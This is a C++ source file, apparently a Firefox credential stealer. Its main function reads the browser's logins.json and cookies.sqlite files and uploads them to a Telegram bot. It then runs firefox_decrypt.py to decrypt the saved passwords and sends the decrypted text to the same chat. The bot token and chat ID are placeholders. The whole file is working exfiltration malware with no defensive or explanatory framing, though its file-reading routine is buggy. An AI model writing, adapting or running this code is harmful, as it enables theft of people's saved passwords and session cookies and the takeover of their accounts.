#include "Firefox_Telegram_Sender.h"
#include <fstream>
#include <sstream>
#include <openssl/http.h>

#define CPPHTTPLIB_OPENSSL_SUPPORT

#include "httplib.h"

void sendMessage(std::string TOKEN, std::string USER, std::string MESSAGE) {

	httplib::Client cli("https://api.telegram.org");

	std::string link = "/bot" + TOKEN + "/sendMessage?chat_id=" + USER + "&text=" + MESSAGE;

	cli.Get(link);
}

void SendFile(std::string TOKEN, std::string USER, std::string name, std::string file) {
	httplib::Client cli("https://api.telegram.org");

	std::string link = "/bot" + TOKEN + "/sendDocument";

	httplib::MultipartFormDataItems items = {
		{"chat_id", USER, "", ""},
		{"document", file, name, "application/octet-stream"}
	};

	cli.Post(link, items);
}

std::string ReadFile(const std::string& path) {
	std::string os;

	std::ifstream file(path, std::ios::binary);

	if (file.is_open()) {
		while (std::getline(file, os)) {}
	}

	return os;
}

char* getStringByFile(const std::string& path) {
	FILE* f;
	fopen_s(&f, path.c_str(), "r");

	fseek(f, 0, SEEK_END);
	size_t size = ftell(f);
	fseek(f, 0, SEEK_SET);

	char* res = new char[size + 1];

	char c = 0;
	int i = 0;
	while (fscanf_s(f, "%c", &c, 1) != EOF)
	{
		res[i++] = c;
	}
	res[i] = '\0';
	return res;
}

int main() {
	std::string botToken = "Your_botToken";
	std::string chatID = "Your_ID";

	try {
		std::string jsonfile = ReadFile("logins.json");
		std::string name1 = "logins.json";

		SendFile(botToken, chatID, name1, jsonfile);

		std::string sqlitefile = ReadFile("cookies.sqlite");
		std::string name2 = "cookies.sqlite";

		SendFile(botToken, chatID, name2, sqlitefile);

		system("python firefox_decrypt.py");

		char* decode = getStringByFile("tb.txt");
		sendMessage(botToken, chatID, std::string(decode));
	}
	catch (std::invalid_argument e) {
		std::cout << e.what();
	}

	return 0;
}